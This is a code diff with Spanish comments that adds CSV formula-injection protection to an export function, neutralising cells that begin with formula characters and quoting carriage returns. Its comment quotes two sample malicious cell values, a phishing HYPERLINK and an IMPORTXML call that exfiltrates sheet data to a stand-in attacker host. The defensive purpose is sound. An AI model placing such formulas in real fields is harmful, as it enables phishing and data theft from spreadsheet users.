@@ -33,12 +33,52 @@ export function toCSV(rows: CSVRow[], columns?: { key: string; label: string }[]
   return `${header}\n${body}`
 }
 
-/** Escapa un valor para CSV: comillas dobles y saltos de línea */
+// ============================================================================
+// Inyección de fórmulas (CWE-1236)
+// ============================================================================
+// En un CSV, si una celda empieza por uno de estos caracteres, Excel, Google
+// Sheets y LibreOffice NO la muestran como texto: la EJECUTAN como fórmula.
+//
+// Y en este CSV hay dos campos que escribe el usuario:
+//   - Pack    → el título del pack, lo pone el comercio
+//   - Cliente → el nombre visible, lo pone el cliente
+//
+// Conque alguien se llame:
+//
+//   =HYPERLINK("http://sitio-falso.cl","Ver mi reserva")
+//   =IMPORTXML("http://atacante.cl?d="&A2,"//x")
+//
+// y el comercio exporte sus reservas y abra el archivo, la fórmula se ejecuta.
+// Puede pescar al comercio o exfiltrar datos de la hoja.
+//
+// La defensa estándar es poner un apóstrofo delante: la celda pasa a ser texto
+// y la fórmula se muestra, no se ejecuta. Es lo que hace OWASP y lo que hacen
+// las librerías serias de CSV.
+// ============================================================================
+const INICIO_FORMULA = /^[=+\-@\t\r]/
+
+/** Un número de verdad no es una fórmula: -1500 tiene que seguir siendo -1500. */
+function esNumeroPlano(value: string): boolean {
+  const limpio = value.trim()
+  return limpio !== '' && Number.isFinite(Number(limpio))
+}
+
+/** Escapa un valor para CSV: comillas dobles, saltos de línea y fórmulas. */
 function escapeCSV(value: string): string {
-  if (value.includes(',') || value.includes('"') || value.includes('\n')) {
-    return `"${value.replace(/"/g, '""')}"`
+  const neutralizado = INICIO_FORMULA.test(value) && !esNumeroPlano(value) ? `'${value}` : value
+
+  // El \r también cuenta: un retorno de carro suelto parte la línea en Excel
+  // igual que el \n. Antes no se comprobaba.
+  const necesitaComillas =
+    neutralizado.includes(',') ||
+    neutralizado.includes('"') ||
+    neutralizado.includes('\n') ||
+    neutralizado.includes('\r')
+
+  if (necesitaComillas) {
+    return `"${neutralizado.replace(/"/g, '""')}"`
   }
-  return value
+  return neutralizado
 }
 
 /**
